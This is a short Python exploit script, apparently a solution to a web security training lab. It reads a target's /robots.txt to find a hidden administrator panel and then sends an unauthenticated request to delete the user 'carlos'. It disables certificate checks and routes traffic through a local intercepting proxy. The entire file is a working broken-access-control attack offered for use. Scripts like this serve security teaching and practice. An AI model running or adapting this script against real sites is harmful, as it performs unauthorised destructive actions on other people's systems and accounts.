import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def print_robots(url):
    uri = "/robots.txt"
    r = requests.get(url + uri, verify=False, proxies=proxies)
    print(r.text)


def delete_carlos(url):
    uri = "/administrator-panel/delete?username=carlos"
    r = requests.get(url + uri, verify=False, proxies=proxies)
    if "User deleted successfully!" in r.text:
        return True
    return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("[+] Testing: Access Control Vulnerability")
    print("[+] The file /robots.txt contains name and path of a hidden page freely accessible from which a regular user can delete other users\n")

    print("[+] Printing the content of /robots.txt...")
    print_robots(url)
    print("\n[+] Accessing now /administrator-panel and deleting the user 'carlos'")
    if not delete_carlos(url):
        print("[-] Ooopsie, something went wrong!")
        sys.exit(-1)
    print("[+] User deleted successfully!")
